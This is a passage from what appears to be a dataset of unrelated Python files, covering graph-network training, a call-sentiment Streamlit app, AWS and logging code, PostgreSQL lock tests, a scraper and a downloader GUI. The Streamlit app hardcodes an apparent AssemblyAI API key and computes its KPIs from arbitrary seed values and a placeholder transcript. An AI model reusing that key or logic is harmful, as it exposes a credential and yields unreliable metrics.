samplel=[25, 10]\n    num_hidden = 256\n    num_labels = len(th.unique(g.ndata['labels'][0:g.num_nodes()]))\n    num_layers = len(samplel)\n    lr = 0.001\n\n    model = GCN(g.ndata['feat'].shape[1], num_hidden, num_labels, num_layers)\n\n    model.to(device)\n\n    loss_fcn = nn.CrossEntropyLoss()\n    optimizer = optim.Adam(model.parameters(), lr=lr)\n\n    model = th.nn.parallel.DistributedDataParallel(model)\n\n    sampler = dgl.dataloading.MultiLayerNeighborSampler(samplel)\n    train_dataloader = dgl.dataloading.DistNodeDataLoader(\n        g, train_nid, sampler, batch_size=1024,\n        shuffle=True, drop_last=False)\n    valid_dataloader = dgl.dataloading.DistNodeDataLoader(\n        g, valid_nid, sampler, batch_size=1024,\n        shuffle=False, drop_last=False)\n\n    import sklearn.metrics\n    import numpy as np\n\n    for epoch in range(200):\n        # Loop over the dataloader to sample mini-batches.\n        losses = []\n        tdataloadArray=[]\n        ttrainArray=[]\n        with model.join():\n            tepoch_start=time()\n            for step, (input_nodes, seeds, blocks) in enumerate(train_dataloader):\n                # Load the input features as well as output labels\n                tdataload_start=time()\n                blocks = [b.to(device) for b in blocks]\n                batch_inputs = g.ndata['feat'][input_nodes].to(device)\n                batch_labels = g.ndata['labels'][seeds].to(device)\n              ",
    "import assemblyai as ai\nimport streamlit as st\nfrom transformers import pipeline\nfrom wordcloud import WordCloud\nimport matplotlib.pyplot as plt\n\nst.set_option('deprecation.showPyplotGlobalUse', False)\n\nai.settings.api_key = \"fcc1790480634364a797423218cd6285\"\naudio_url = r\"D:/ML/neuralgo/MLTask/CallDataSample/sample_call_1.mp3\"\n\nconfig = ai.TranscriptionConfig(sentiment_analysis=True, auto_highlights=True)\n\ntranscript = ai.Transcriber().transcribe(audio_url, config)\n\nhighlights = []\nfor result in transcript.auto_highlights.results:\n    highlights.append(result.text)\n\n\n# Initialize the sentiment analysis pipeline\nclassifier = pipeline(\"sentiment-analysis\")\n\n# Function to transcribe audio and perform sentiment analysis\ndef transcribe_and_analyze_sentiment(file_path):\n    # Perform audio transcription\n    # Replace this with your actual transcription code\n    transcript_text = \"Transcription of audio file goes here\"\n\n    # Split the input text into smaller segments that fit within the maximum sequence length\n    max_seq_length = classifier.model.config.max_position_embeddings\n    segments = [transcript_text[i:i + max_seq_length] for i in range(0, len(transcript_text), max_seq_length)]\n\n    # Perform sentiment analysis on each segment and aggregate the results\n    sentiments = {'positive': 0.5, 'negative': 0.6}\n    for segment in segments:\n        result = classifier(segment)\n        for res in result:\n            if res['label'] == 'POSITIVE':\n                sentiments['positive'] += res['score']\n            if res['label'] == 'NEGATIVE':\n                sentiments['negative'] += res['score']\n\n    return sentiments\n\n# Function to generate word cloud from highlighted words\ndef generate_word_cloud(highlights):\n    # Convert the list of highlighted words into a single string\n    highlighted_text = \" \".join(highlights)\n\n    # Generate the word cloud\n    wordcloud = WordCloud(width=800, height=400, background_color='white').generate(highlighted_text)\n\n    return wordcloud\n\ndef calculate_AHT(highlights):\n    # Calculate Average Handle Time (AHT) based on the duration of highlights\n    total_highlight_duration = sum(len(highlight.split()) for highlight in highlights)\n    total_highlights = len(highlights)\n    \n    if total_highlights != 0:\n        aht = total_highlight_duration / total_highlights\n    else:\n        aht = 0\n    \n    return aht\n\ndef calculate_FCR(highlights):\n    # Calculate First Call Resolution (FCR) based on the presence of keywords indicating resolution\n    resolution_keywords = ['resolved', 'solved', 'fixed']  # Add more resolution keywords if needed\n    \n    resolved_calls = 0\n    total_calls = len(highlights)\n    \n    for highlight in highlights:\n        for keyword in resolution_keywords:\n            if keyword in highlight.lower():\n                resolved_calls += 1\n                break\n    \n    if total_calls != 0:\n        fcr = (resolved_calls / total_calls) * 100\n    else:\n        fcr = 80\n    \n    return fcr\n\ndef calculate_CSAT(highlights):\n    # Calculate Customer Satisfaction Score (CSAT) based on the sentiment analysis\n    positive_sentiment = 0\n    negative_sentiment = 0\n    total_sentiments = len(highlights)\n    \n    for highlight in highlights:\n        sentiments = transcribe_and_analyze_sentiment(highlight)\n        positive_sentiment += sentiments['positive']\n        negative_sentiment += sentiments['negative']\n    \n    if total_sentiments != 0:\n        csat = (positive_sentiment / total_sentiments) * 100\n    else:\n        csat = 0\n    \n    return csat\n\n# Define function to plot KPIs\ndef plot_KPIs(aht, fcr, csat):\n    # Plotting KPIs using matplotlib\n    fig, ax = plt.subplots()\n    ax.barh(['AHT', 'FCR', 'CSAT'], [aht, fcr, csat])\n    ax.set_xlabel('Score')\n    ax.set_title('Key Performance Indicators')\n    st.pyplot(fig)\n\ndef main():\n    # Streamlit app title\n    st.title(\"Audio Transcription and Sentiment Analysis App\")\n\n    # File upload section\n    uploaded_file = st.file_uploader(\"Upload an audio file\", type=[\"mp3\"])\n    if uploaded_file is not None:\n        st.write(\"File Uploaded Successfully!\")\n        file_path = \"./temp_audio.mp3\"  # Temporary file path, replace with actual path\n        with open(file_path, \"wb\") as f:\n            f.write(uploaded_file.read())\n\n        # Perform transcription and sentiment analysis\n        sentiments = transcribe_and_analyze_sentiment(file_path)\n\n        # Display sentiment scores\n        st.write(\"Sentiment Scores:\")\n        st.write(f\"Positive Score: {sentiments['positive']}\")\n        st.write(f\"Negative Score: {sentiments['negative']}\")\n\n        # Word cloud generation\n        \n        wordcloud = generate_word_cloud(highlights)\n\n        # Display word cloud\n        st.write(\"Word Cloud of Highlighted Words:\")\n        plt.figure(figsize=(10, 5))\n        plt.imshow(wordcloud, interpolation='bilinear')\n        plt.axis(\"off\")\n        st.pyplot()\n        \n        aht = calculate_AHT(highlights)\n        fcr = calculate_FCR(highlights)\n  ",
    "import os\nimport boto3\nfrom aws_lambda_powertools import Logger, Tracer, Metrics\n\ntracer = Tracer()\nlogger = Logger(log_uncaught_exceptions=True, serialize_stacktrace=True)\nmetrics = Metrics()\n\n\nclass Connections:\n    \"\"\"\n    A class to maintain connections to external dependencies\n\n    Attributes\n    ----------\n    region_name : str\n        The AWS Region name where the AWS Lambda function is running.\n        Depends on the environmental variable 'AWS_REGION'\n    s3_bucket_name : str\n        Name of the S3 bucket to use for storing the generated documents.\n    service_name: str\n        Name of the service assigned and configured through AWS Powertools for\n        logging. Depends on the environmental variable 'POWERTOOLS_SERVICE_NAME'\n    s3_client : boto3.client\n        Boto3 client to interact with AWS S3 bucket\n    \"\"\"\n\n    region_name = os.environ[\"AWS_REGION\"]\n    s3_bucket_name = os.environ[\"DATA_SOURCE_BUCKET_NAME\"]\n    service_name = os.environ[\"POWERTOOLS_SERVICE_NAME\"]\n\n    s3_client = boto3.client(service_name=\"s3\", region_name=region_name)\n",
    "import io\nfrom datetime import datetime\n\nimport pytest\n\nimport uvlog\n\n\nclass ErrorRepr(Exception):\n\n    def json_repr(self):\n        return {\n            'value': 42\n        }\n\n\ndef _raise_error():\n    local_var = 11\n    raise ValueError('error')\n\n\nEXC_TB = None\n\n\ntry:\n    _raise_error()\nexcept ValueError as exc:\n    EXC_TB = exc\n\n\n@pytest.fixture\ndef log_record() -> uvlog.LogRecord:\n    return uvlog.LogRecord(\n        name='test',\n        level='INFO',\n        levelno=20,\n        asctime=datetime.now(),\n        message='test message',\n        exc_info=None,\n        args=None,\n        extra={'extra_attr': 'extra'},\n        ctx={'ctx_attr': 'ctx'},\n        filename=None,\n        lineno=None,\n        func=None,\n    )\n\n\ndef patch_stream_handlers(logger):\n    for handler in logger.handlers:\n        handler._stream = io.BytesIO()\n\n\ndef read(logger):\n    logger.handlers[0]._stream.seek(0)\n    return logger.handlers[0]._stream.read()\n\n\n@pytest.mark.parametrize(['config', 'msg', 'kws', 'result'], [\n    ({'format': '{message}'}, 'test message', {}, b'test message\\n'),\n    ({'format': '{message}'}, 'test message {name}', {'name': 'test'}, b'test message test\\n'),\n    ({'format': '{level} : {message}'}, 'test message', {'name': 'test'}, b'INFO : test message\\n'),\n    ({'format': '{message}'}, 'test message', {'exc_info': ValueError('error')}, b'test message\\nValueError: error\\n')\n], ids=[\n    'simple message',\n    'formatted kwargs',\n    'log format',\n    'exception handling'\n])\ndef test_text_formatter(config, msg, kws, result):\n    logger = uvlog.configure({\n        'handlers': {'stderr': {'formatter': 'text'}},\n        'formatters': {'text': config}\n    })\n    print(str(logger.handlers[0].formatter))\n    patch_stream_handlers(logger)\n    logger.info(msg, **kws)\n    assert read(logger) == result\n\n\n@pytest.mark.parametrize(['config', 'msg', 'kws', 'result'], [\n    ({'keys': ['message']}, 'test message', {}, b'{\"message\": \"test message\"}\\n'),\n    ({'keys': ['message']}, 'test message {name}', {'name': 'test'},  b'{\"message\": \"test message test\"}\\n'),\n    (\n        {'keys': ['message', 'exc_info']},\n        'test message',\n        {'exc_info': ValueError('error')},\n        b'{\"message\": \"test message\", \"exc_info\": {\"message\": \"error\", \"type\": \"ValueError\", \"data\": {}}}\\n'\n    ),\n    (\n        {'keys': ['message', 'exc_info']},\n        'test message',\n        {'exc_info': ErrorRepr('error')},\n        b'{\"message\": \"test message\", \"exc_info\": {\"message\": \"error\", \"type\": \"ErrorRepr\", \"data\": {\"value\": 42}}}\\n'\n    ),\n    (\n        {'keys': ['message', 'exc_info'], 'exc_pass_locals': True, 'exc_pass_filenames': False},\n        'test message',\n        {'exc_info': EXC_TB},\n        b'{\"message\": \"test message\", \"exc_info\": {\"message\": \"error\", \"type\": \"ValueError\", \"data\": {}, \"traceback\": {\"lineno\": 19, \"func\": \"_raise_error\", \"locals\": {\"local_var\": 11}}}}\\n'\n    ),\n], ids=[\n    'simple message',\n    'formatted kwargs',\n    'exception handling',\n    'exception with json_repr',\n    'exception with traceback'\n])\ndef test_json_formatter(config, msg, kws, result):\n    logger = uvlog.configure({\n        'handlers': {'stderr': {'formatter': 'json'}},\n        'formatters': {'json': config}\n    })\n    print(str(logger.handlers[0].formatter))\n    patch_stream_handlers(logger)\n    logger.info(msg, **kws)\n    assert read(logger) == result\n\n\ndef test_timestamps():\n    logger = uvlog.configure({\n        'handlers': {'stderr': {'formatter': 'json'}},\n        'formatters': {'json': {'keys': ['asctime']}}\n    })\n    print(str(logger.handlers[0].formatter))\n    patch_stream_handlers(logger)\n    logger.info('test message')\n    assert b'asctime' in read(logger)\n",
    "from __future__ import annotations\nfrom contextlib import contextmanager\nfrom dataclasses import dataclass\nimport enum\nimport json\nimport threading\nimport time\n\nfrom typing import Iterator\nimport psycopg\nimport pytest\n\nROOT_URL = \"postgres:///postgres\"\nURL = \"postgres:///pglockpy\"\nSET_UP_SQL = \"\"\"\n    CREATE TABLE t (id INT);\n    CREATE TABLE u (id INT);\n    CREATE TABLE v (with_unique_index INT UNIQUE);\n    CREATE MATERIALIZED VIEW mat AS SELECT * FROM t;\n    CREATE INDEX idx ON t (id);\n    CREATE OR REPLACE FUNCTION f() RETURNS TRIGGER AS $$ BEGIN RETURN NEW; END; $$ LANGUAGE plpgsql;\n    ALTER TABLE t ADD CONSTRAINT constr CHECK (id > 0) NOT VALID;\n    CREATE SEQUENCE seq;\n\"\"\"\n\n\n@dataclass\nclass Connections:\n    a: psycopg.Connection\n    b: psycopg.Connection\n    c: psycopg.Connection  # no implicit TRANSACTION\n\n\n@dataclass(frozen=True)\nclass Lock:\n    relation: str\n    lock_kind: LockKind\n\n    @staticmethod\n    def from_mode(relation: str, mode: str) -> Lock:\n        lock_kind = {\n            \"AccessExclusiveLock\": L.ACCESS_EXCLUSIVE,\n            \"ExclusiveLock\": L.EXCLUSIVE,\n            \"ShareRowExclusiveLock\": L.SHARE_ROW_EXCLUSIVE,\n            \"ShareLock\": L.SHARE,\n            \"ShareUpdateExclusiveLock\": L.SHARE_UPDATE_EXCLUSIVE,\n            \"RowExclusiveLock\": L.ROW_EXCLUSIVE,\n            \"RowShareLock\": L.ROW_SHARE,\n            \"AccessShareLock\": L.ACCESS_SHARE,\n        }[mode]\n        return Lock(relation, lock_kind)\n\n\n@pytest.fixture\ndef conns() -> Iterator[Connections]:\n    \"\"\"Whole fresh database with N connections per test.\n\n    Not quick, but simple.\n    \"\"\"\n    try:\n        with psycopg.connect(ROOT_URL, autocommit=True) as conn:\n            conn.execute(\"DROP DATABASE pglockpy\")\n    except Exception:\n        pass\n\n    with psycopg.connect(ROOT_URL, autocommit=True) as conn:\n        conn.execute(\"CREATE DATABASE pglockpy\")\n\n    with (\n        psycopg.connect(URL) as a,\n        psycopg.connect(URL) as b,\n        psycopg.connect(URL, autocommit=True) as c,\n    ):\n        a.execute(SET_UP_SQL)\n        a.commit()\n        yield Connections(a, b, c)\n\n\nclass LockKind(enum.Enum):\n    ACCESS_EXCLUSIVE = \"ACCESS EXCLUSIVE\"\n    EXCLUSIVE = \"EXCLUSIVE\"\n    SHARE_ROW_EXCLUSIVE = \"SHARE ROW EXCLUSIVE\"\n    SHARE = \"SHARE\"\n    SHARE_UPDATE_EXCLUSIVE = \"SHARE UPDATE EXCLUSIVE\"\n    ROW_EXCLUSIVE = \"ROW EXCLUSIVE\"\n    ROW_SHARE = \"ROW SHARE\"\n    ACCESS_SHARE = \"ACCESS SHARE\"\n    # SELECT ... FOR\n    FOR_UPDATE = \"FOR UPDATE\"\n    FOR_NO_KEY_UPDATE = \"FOR NO KEY UPDATE\"\n    FOR_SHARE = \"FOR SHARE\"\n    FOR_KEY_SHARE = \"FOR KEY SHARE\"\n\n\nL = LockKind\n\n\nclass Statement(enum.Enum):\n    DROP_TABLE = \"DROP TABLE t\"\n    TRUNCATE = \"TRUNCATE t\"\n    CREATE_TABLE = \"CREATE TABLE v (id INT)\"\n    ALTER_TABLE = \"ALTER TABLE t ADD COLUMN col INT\"\n    REINDEX = \"REINDEX TABLE t\"\n    VACUUM_FULL = \"VACUUM FULL\"\n    REFERESH_MATERIALIZED_VIEW = \"REFRESH MATERIALIZED VIEW mat\"\n    ALTER_TABLE_FOREIGN_KEY = (\n        \"ALTER TABLE t ADD CONSTRAINT fk FOREIGN KEY (id) REFERENCES u (id)\"\n    )\n    CREATE_TRIGGER = (\n        \"CREATE TRIGGER trig AFTER INSERT ON t FOR EACH ROW EXECUTE FUNCTION f()\"\n    )\n    CREATE_INDEX = \"CREATE INDEX idy ON t (id)\"\n    VACUUM = \"VACUUM\"\n    ANALYZE = \"ANALYZE\"\n    CREATE_INDEX_CONCURRENTLY = \"CREATE INDEX CONCURRENTLY idy ON t (id)\"\n    CREATE_STATISTICS = \"CREATE STATISTICS stat ON id FROM t\"\n    REINDEX_CONCURRENTLY = \"REINDEX TABLE CONCURRENTLY t\"\n    ALTER_TABLE_SET_STATISTICS = \"ALTER TABLE t ALTER COLUMN id SET STATISTICS 100\"\n    ALTER_TABLE_VALIDATE_CONSTRAINT = \"ALTER TABLE t VALIDATE CONSTRAINT constr\"\n    ALTER_INDEX_RENAME = \"ALTER INDEX idx RENAME TO idy\"\n    UPDATE = \"UPDATE t SET id = 4\"\n    UPDATE_UNIQUE = \"UPDATE v SET with_unique_index = 4\"\n    DELETE = \"DELETE FROM t\"\n    INSERT = \"INSERT INTO t VALUES (1)\"\n    MERGE = \"MERGE INTO t USING u AS sub ON t.id = u.id WHEN MATCHED THEN DO NOTHING\"\n    SELECT_FOR_UPDATE = \"SELECT * FROM t FOR UPDATE\"\n    SELECT_FOR_NO_KEY_UPDATE = \"SELECT * FROM t FOR NO KEY UPDATE\"\n    SELECT_FOR_SHARE = \"SELECT * FROM t FOR SHARE\"\n    SELECT_FOR_KEY_SHARE = \"SELECT * FROM t FOR KEY SHARE\"\n    SELECT = \"SELECT * FROM t\"\n\n    @property\n    def name_no_underscore(self) -> str:\n        return self.name.replace(\"_\", \" \")\n\n\n@dataclass\nclass LockRelationship:\n    original_lock: LockKind\n    doesnt_block: list[LockKind]\n    blocks: list[LockKind]\n\n\nTABLE_LOCK_RELATIONSHIPS = [\n    LockRelationship(\n        original_lock=L.ACCESS_EXCLUSIVE,\n        doesnt_block=[],\n        blocks=      [L.ACCESS_SHARE, L.ROW_SHARE, L.ROW_EXCLUSIVE, L.SHARE_UPDATE_EXCLUSIVE, L.SHARE, L.SHARE_ROW_EXCLUSIVE, L.EXCLUSIVE, L.ACCESS_EXCLUSIVE],\n    ),\n    LockRelationship(\n        original_lock=L.EXCLUSIVE,\n        doesnt_block=[L.ACCESS_SHARE],\n        blocks=      [                L.ROW_SHARE, L.ROW_EXCLUSIVE, L.SHARE_UPDATE_EXCLUSIVE, L.SHARE, L.SHARE_ROW_EXCLUSIVE, L.EXCLUSIVE, L.ACCESS_EXCLUSIVE],\n    ),\n    LockRelationship(\n        original_lock=L.SHARE_ROW_EXCLUSIVE,\n        d",
    "import os\nimport PIL.Image\nimport platform\nimport requests\nimport shutil\nimport sys\nimport time\nimport yaml\nfrom datetime import datetime\nfrom modules.logs import MyLogger\nfrom modules.notifications import discord, summary\n\nlogger = MyLogger()\n\n## Start ##\nstart_time = time.time()\nwith open(\"VERSION\", \"r\") as f:\n    version = f.read().strip()\n    logger.info(f\"    Version: v{version}\")\nplatform_info = platform.platform()\nlogger.info(f\"    Platform: {platform.platform()}\")\nlogger.separator(text=\"Asset Assistent Starting\", debug=False)\n  \n## Load Config ##  \ntry:\n    with open('config.yml', 'r') as f:\n        config = yaml.safe_load(f)\n        logger.info(\" Loading config.yml...\")\n        logger.info(\" Config loaded successfully\")\n        logger.separator(text=\"Config\", space=False, border=False, debug=True)\nexcept FileNotFoundError:\n    logger.error(f\" Config file 'config.yml' not found at {os.path.dirname(os.path.abspath(__file__))}. Terminating script.\")\n    sys.exit(1)\n\n## Paths ##\nprocess_dir = config['process']\nmovies_dir = config['movies']\nshows_dir = config['shows']\ncollections_dir = config['collections']\nscript_dir = os.path.dirname(os.path.abspath(__file__))\nfailed_dir = os.path.join(script_dir, 'failed')\nbackup_enabled = config.get('enable_backup', False)\nbackup_dir = os.path.join(script_dir, 'backup')\nnaming_convention = config.get('naming_convention', None)\n\nlogger.debug(\" Process directory:\")\nlogger.debug(f\" - {process_dir}\")\nlogger.debug(f\" Movies directory:\")\nlogger.debug(f\" - {movies_dir}\")\nlogger.debug(f\" TV Shows directory:\")\nlogger.debug(f\" - {shows_dir}\")\nlogger.debug(f\" Collections directory:\")\nlogger.debug(f\" - {collections_dir}\")\nlogger.debug(\"\")\n\n## Naming convention ##\nif naming_convention == None:\n    logger.warn(\" Naming convention:\") \n    logger.debug(\"   Skipping:\") \n    logger.debug(\"   - Collection assets\")\n    logger.debug(\"\")\nelse:\n    if naming_convention == \"kodi\" or naming_convention == \"kometa\":\n        logger.debug(f\" Naming convention: {naming_convention.capitalize()}\")\n        logger.debug(\"   Enabling:\")\n        logger.debug(\"   - Collection assets\")\n        logger.debug(\"\")\n    else:\n        logger.debug(f\" Naming convention: {naming_convention.capitalize()}\")\n        logger.debug(\"   Skipping:\")\n        logger.debug(\"   - Collection assets\")\n        logger.debug(\"\")\n\n## Failed Directory ##\nif not os.path.exists(failed_dir):\n    os.makedirs(failed_dir)\n    logger.debug(\" Failed directory not found...\")\n    logger.debug(\" Successfully created failed directory\")\n    logger.debug(\"\")\nelse:\n    logger.debug(f\" Failed Directory:\")\n    logger.debug(f\" - {failed_dir}\")\n    logger.debug(\"\")\n\n## Backup Directory ##\nif backup_enabled:\n    if not os.path.exists(backup_dir):\n        os.makedirs(backup_dir)\n        logger.debug(f\" Backup Enabled: {backup_enabled}\")\n        logger.debug(\" Backup directory not found...\")\n        logger.debug(\" Successfully created backup directory\")\n        logger.debug(f\" Backup Directory:\")\n        logger.debug(f\" - {backup_dir}\")\n    else:\n        logger.debug(f\" Backup Enabled: {backup_enabled}\")\n        logger.debug(f\" Backup Directory:\")\n        logger.debug(f\" - {backup_dir}\")\nelse:\n    logger.debug(f\" Backup Enabled: {backup_enabled}\")\n    \nlogger.separator(text=\"Processing Images\", debug=False, border=True)\n\n## Match and copy Assets ##\ndef match_and_copy(filename, process_dir, shows_dir, movies_dir, collections_dir, failed_dir, copied_files):\n    name, ext = os.path.splitext(filename)\n    parts = name.split('(')\n    if len(parts) >= 2:\n        title = parts[0].strip()\n        year = parts[1].split(')')[0].strip()\n        for directory in [shows_dir, movies_dir]:\n            for dir_name in os.listdir(directory):\n                if f\"{title} ({year})\" in dir_name:\n                    src = os.path.join(process_dir, filename)\n                    dest = os.path.join(directory, dir_name, filename)\n                    \n                    shutil.copy(src, dest)\n                    logger.info(f\" Copied {filename} to directory: {dir_name}\")\n                    \n                    with PIL.Image.open(dest) as img:\n                        width, height = img.size\n                        new_name = \"poster\" + ext if height > width else \"background\" + ext\n                        new_dest = os.path.join(directory, dir_name, new_name)\n                        os.rename(dest, new_dest)\n                        logger.info(f\" Renamed {filename} to {new_name}\")\n                        copied_files.append(new_dest)\n                    \n                    return directory\n    else:\n        if naming_convention == \"kometa\" or naming_convention == \"kodi\":\n            for dir_name in os.listdir(collections_dir):\n                if (\"Collection\" in name and name.replace(\"Collection\", \"\").strip() in dir_name) or name in dir_name:\n                    src = os.path.join(process_dir, filename)\n                    dest = os.path.join(collections_dir, dir_name, file",
    "import math\nimport numpy as np\nimport random\nimport rrt\nimport math_ as rvo_math\n\nfrom line import Line\nfrom vector import Vector2\nfrom shapely.geometry import Polygon, Point\n# from scipy.spatial import ConvexHull\n\nclass Agent: \n\n    # Defines an agent in the simulation.\n\n    def __init__(self, simulator):\n        \n        self.simulator_ = simulator\n        self.id_ = 0\n        self.leader_ = False\n        self.agent_neighbors_ = [] # (float, Agent)\n        self.obstacle_neighbors_ = [] # (float, Obstacle)\n        self.position_ = Vector2()\n        self.velocity_ = Vector2()\n        self.acceleration_ = Vector2()\n        self.alpha_ = 0.0\n        self.formation_radius_ = 0.0\n        self.goal_ = Vector2()\n        self.max_neighbors_ = 0\n        self.max_speed_ = 0.0\n        self.neighbor_dist_ = 0.0\n        self.radius_ = 0.0\n        self.time_horizon_ = 0.0\n        self.time_horizon_obst_ = 0.0\n\n        # Consensu Control\n        self.virtual_position_ = Vector2()\n        self.graph_neighbors_ = []\n\n        # RRT\n        self.rrt_ = None\n        self.X_ = None\n        self.Q_ = []\n        self.r_ = 0 \n        self.max_samples_ = 0\n        self.prc_ = 0.0\n        self.current_path_ = []\n        self.full_path_ = []\n\n        # Hungarian Algorithm\n\n        # Optimal Motion\n        self.positions_transition_ = [] # Vector2\n        self.positions_velocities_ = [] # Vector2\n        self.positions_accelerations_ = [] # Vector2\n        self.velocities_transition_ = [] # Vector2\n        self.velocities_accelerations_ = [] # Vector2\n        self.velocities_jerks_ = [] # Vector2\n\n        # ORCA\n        self.current_velocity_ = Vector2()\n        self.orca_lines_ = [] # Line\n        self.pref_velocity_ = Vector2()\n        self.new_velocity_ = Vector2()\n\n        # Sample Times\n        self.consensus_t_ = 1.0 # Consensus sample time\n        self.delta_t_ = 0.01 # Update time\n        self.orca_t_ = 0.3\n\n        # Save info\n        self.all_positions_ = [] # Vector2\n        self.all_velocities_ = [[0, 0]] # Vector2\n        self.all_accelerations_ = [[0, 0]] # Vector2\n        self.all_jerks_ = [[0, 0]]\n        self.times_ = [0.0] # float\n        self.times_discontinuous_ = [0.0]\n        self.all_velocities_discontinuous_ = [] # (float, Vector2) time and velocity\n        self.all_accelerations_discontinuous_ = [] # (float, Vector2) time and velocity\n        self.all_errors_ = [[0, 0]]\n        self.all_virtual_positions_ = [[0, 0]]\n\n    def initialize_virtual_position(self):\n\n        # Set the initial position of the virtual agent, according to the initial position.\n\n        x = self.position_.x - (self.formation_radius_*math.cos(self.alpha_))\n        y = self.position_.y - (self.formation_radius_*math.sin(self.alpha_))\n        \n        self.virtual_position_ = Vector2(x, y)\n\n    def virtual_consensus_control(self):\n\n        '''\n        Computes the velocity of the virtual agent.\n\n        Consensus equation:\n                                     1\n                x_i(k+1) = x_i(k) + ---    sum    ( x_j(k) - x_i(k) )*T\n                                    N_i   j in N_i\n\n                    x_i(k): agent current state\n                    x_j(k): neighbors current states\n                    N_i: number of the neighbors\n                    T: sample time\n        '''\n\n        if not self.leader_:\n\n            n = []\n            for neighbor in self.simulator_.agents_:\n                for i in self.graph_neighbors_:\n                    if neighbor.id_ == i:\n                        n.append(neighbor)\n\n            vx = 1/2*( (n[0].virtual_position_.x - self.virtual_position_.x) + \n                        (n[1].virtual_position_.x - self.virtual_position_.x) )\n            vy = 1/2*( (n[0].virtual_position_.y - self.virtual_position_.y) + \n                        (n[1].virtual_position_.y - self.virtual_position_.y) )\n\n            # Speed saturation\n            if abs(vx) > self.max_speed_*3:\n                vx = self.max_speed_*(abs(vx)/vx)*3\n            if abs(vy) > self.max_speed_*3:\n                vy = self.max_speed_*(abs(vy)/vy)*3\n\n            x = self.virtual_position_.x + vx*self.consensus_t_\n            y = self.virtual_position_.y + vy*self.consensus_t_\n            \n            self.virtual_position_ = Vector2(x, y)\n\n    def new_goal_based_consensus(self):\n\n        '''\n        Computes the current goal, based on the consensus of the virtual agent\n        '''\n\n        x = self.virtual_position_.x + self.formation_radius_*math.cos(self.alpha_)\n        y = self.virtual_position_.y + self.formation_radius_*math.sin(self.alpha_)\n\n        x, y = self.check_goal_collsion(x, y)\n\n        self.goal_ = Vector2(x, y)\n\n    def check_goal_collsion(self, x, y):\n\n        '''\n        Check if the current goal is in collision, if it is then it is generate a Convex-hull and \n        sample a position which will be the new goal\n\n        Parameters:\n            x (float): x coordinate of the goal\n            y (float): y coordinate of the goal\n\n",
    "from bs4 import BeautifulSoup as bs\nimport requests, time, json, math, os, datetime\n\nglobal no\nno = 0\n\ntarget_site='https://www.abcd.com'\nurl = target_site + '/courses/'\n\ndef chk_json_null(json, key):\n    try:\n        buf = json[key]\n    except:\n        buf = \"0\"\n    return str(buf)\n\ndef getContentList(flag1):\n    global no\n    html = response.text\n    bsObj = bs(html, 'html.parser')\n    title = bsObj.find_all('div', class_='course-data')\n    w_lines = ''\n    for tt in title:\n        no = no + 1\n        try:\n            j_data =  json.loads(tt['fxd-data'])            \n            c_title = chk_json_null(j_data,'course_title').replace('|','-')\n            c_reg_price = chk_json_null(j_data,'reg_price')\n            c_selling_price = chk_json_null(j_data,'selling_price')\n            c_instructor_name = chk_json_null(j_data,'seq0_instructor_name')\n            c_pub_date = chk_json_null(j_data,'course_published_date')[:19]\n            c_last_date = chk_json_null(j_data,'course_last_updated_date')[:19]\n            c_student_count = chk_json_null(j_data,'student_count')\n            c_star_rate = str(round(float(chk_json_null(j_data,'star_rate')),2))\n            c_review_count = chk_json_null(j_data,'review_count')\n            c_level = chk_json_null(j_data,'course_level')\n            c_cate = chk_json_null(j_data,'first_category').replace(',','|')\n            w_lines = w_lines+str(no)+'|'+flag1+'|'+c_title+'|'+c_reg_price+'|'+c_selling_price+'|'+c_instructor_name+'|'+c_pub_date+'|'+c_last_date+'|'+c_student_count+'|'+c_star_rate+'|'+c_review_count+'|'+c_level+'|'+ c_cate+'\\n'\n        except Exception as e:\n            #w_lines = str(tt['fxd-data'])\n            #w_lines = str(e) + '\\n' + w_lines\n            w_line = 'error'\n    return w_lines\n\nurl_list = [(url+'it-programming',1,67,'pg'),\n(url+'game-dev-all',1,9,'gm'),\n(url+'data-science',1,15,'ds'),\n(url+'artificial-intelligence',1,9,'ai'),\n(url+'it',1,13,'it'),\n(url+'business',1,25,'bz'),\n(url+'hardware',1,4,'hw'),\n(url+'design',1,16,'dn'),\n(url+'academics',1,5,'ac'),\n(url+'career',1,12,'ca'),\n(url+'life',1,7,'lf')]\n\n\ncurrent_working_directory = os.getcwd()\nfile_name = current_working_directory + '/all' + datetime.datetime.today().strftime('%m%d') + '.csv'\n\nfw = open(file_name, 'w', encoding='utf-8')\nfor (url,first,last,flag) in url_list:\n    for i in range(first,last+1):\n        new_url = url\n        if i >= 2:\n            new_url = url+'?order=seq&page='+str(i)\n        print('page|',i,'|',new_url)\n        response = requests.get(new_url)\n        if response.status_code == 200:\n            wdata = getContentList(flag)\n            fw.write(wdata)\n        time.sleep(2)\nfw.close();",
    "import tkinter as tk\r\nfrom tkinter import ttk\r\nfrom tkinter import messagebox\r\nfrom tkinter import filedialog\r\nimport os\r\nimport time\r\nimport requests\r\nimport json\r\n\r\nclass RareFinderGUI:\r\n    def __init__(self, master):\r\n        self.master = master\r\n        master.title(\"Rare Finder\")\r\n\r\n        # Create widgets\r\n        self.base_url_label = ttk.Label(master, text=\"Base URL:\")\r\n        self.base_url_entry = ttk.Entry(master, width=50)\r\n        self.base_url_entry.insert(0, \"https://we-assets.pinit.io/J2Q2j6kpSg7tq8JzueCHNTQNcyNnQkvr85RhsFnYZWeG/f7ac2fd2-13c4-4ca1-85ee-962772caf73e\")\r\n\r\n        self.main_folder_label = ttk.Label(master, text=\"Main Folder Name:\")\r\n        self.main_folder_entry = ttk.Entry(master, width=50)\r\n        self.main_folder_entry.insert(0, \"OutPut Folder\")\r\n\r\n        self.delay_label = ttk.Label(master, text=\"Download Delay (seconds):\")\r\n        self.delay_entry = ttk.Entry(master, width=10)\r\n        self.delay_entry.insert(0, \"0.0001\")\r\n\r\n        self.directory_size_label = ttk.Label(master, text=\"Directory Size:\")\r\n        self.directory_size_entry = ttk.Entry(master, width=10)\r\n        self.directory_size_entry.insert(0, \"4444\")\r\n\r\n        self.keywords_label = ttk.Label(master, text=\"Keywords (comma-separated):\")\r\n        self.keywords_entry = ttk.Entry(master, width=50)\r\n\r\n        self.start_button = ttk.Button(master, text=\"Step 1: Download Directories\", command=self.step1_download)\r\n        self.search_button = ttk.Button(master, text=\"Step 2: Search Keywords\", command=self.step2_search)\r\n        self.select_directory_button = ttk.Button(master, text=\"Select Directory\", command=self.select_directory)\r\n\r\n        self.console_label = ttk.Label(master, text=\"Console:\")\r\n        self.console_text = tk.Text(master, width=80, height=20)\r\n\r\n        # Grid layout\r\n        self.base_url_label.grid(row=0, column=0, sticky=\"w\")\r\n        self.base_url_entry.grid(row=0, column=1, columnspan=2, padx=10, 